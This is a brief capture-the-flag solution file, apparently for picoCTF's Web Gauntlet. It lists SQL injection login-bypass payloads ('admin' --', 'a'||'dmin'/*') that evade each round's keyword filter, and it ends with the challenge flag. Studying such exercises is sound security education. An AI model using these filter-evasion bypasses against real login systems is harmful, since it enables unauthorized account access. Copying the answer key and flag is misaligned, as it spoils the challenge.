#https://zacheller.dev/pico-web-gauntlet

'''
SELECT * FROM users WHERE username='admin'--' AND password='a'

Round 1 - filter: or

admin' --

Round 2 - filter: or and like = –

admin' /*

Round 3 - filter: or and = like > < –

admin'/*

Round 4 - filter: or and = like > < – admin

a'||'dmin'/*

Round 5 - filter: or and = like > < – union admin

a'||'dmin'/*

#picoCTF{y0u_m4d3_1t_96486d415c04a1abbbcf3a2ebe1f4d02}
